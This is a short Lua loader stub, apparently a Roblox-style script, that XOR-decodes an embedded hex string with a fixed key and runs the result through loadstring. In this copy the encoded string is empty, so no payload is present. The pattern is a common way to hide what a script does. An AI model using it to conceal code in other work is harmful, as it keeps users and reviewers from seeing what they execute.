local k={69,22,81,87,144,213,8,195,154,55,193,227,190,48,208,161,211,96,27,193,188,162,44,73,62,20,42,66,161,85,186,240}
local s=[[]]
local t={}
local n=0
for i=1,#s,2 do
	n=n+1
	local v=tonumber(s:sub(i,i+1),16)
	t[n]=string.char(bit32.bxor(v,k[((n-1)%#k)+1]))
end
local c=loadstring or load
local fn,err=c(table.concat(t))
if not fn then error(tostring(err),0) end
return fn()
